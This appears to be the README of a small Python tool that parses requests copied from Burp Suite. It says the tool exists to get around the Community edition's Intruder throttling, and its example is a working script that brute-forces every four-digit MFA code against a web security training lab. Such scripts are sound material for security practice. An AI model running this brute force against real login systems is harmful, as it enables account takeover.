# What is it
A Burp Suite request parser, used for aid in assessing application security functionality.

# Why I wrote it
To bypass the throttling 'Burp Suite Community' does to the intruder.

# Usage
Use burpr.py module to parse the Burp Suite copied request. Then use the created object to extract headers and body.

Supports parsing requests as strings and as .txt files.

```python
import burpr
req = burpr.parse_string(req)

client = httpx.Client(http2=True)
res = client.post(req.url, headers=req.headers, data=req.body)
```

# Examples
## Brute force broken MFA
```python
import burpr
import httpx
import itertools

burp_request = r"""POST /login2 HTTP/2
Host: xxxx.web-security-academy.net
Cookie: verify=carlos; session=xxxx
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://xxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xxxx.web-security-academy.net/login2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

mfa-code=4321
"""

def generate_pin_numbers():
  return [''.join(list([str(digit) for digit in permutation])) 
          for permutation in itertools.product(list(range(0, 10)), repeat=4)]

def brute_force_broken_mfa():
  req = burpr.parse_string(burp_request)
  client = httpx.Client(http2=True)

  for pin in generate_pin_numbers():
    req.body["mfa-code"] = pin  
    res = client.post(req.url, headers=req.headers, data=req.body)

    print(res.status_code, pin)
    
    if (res.status_code != 200):
      break

brute_force_broken_mfa()
```
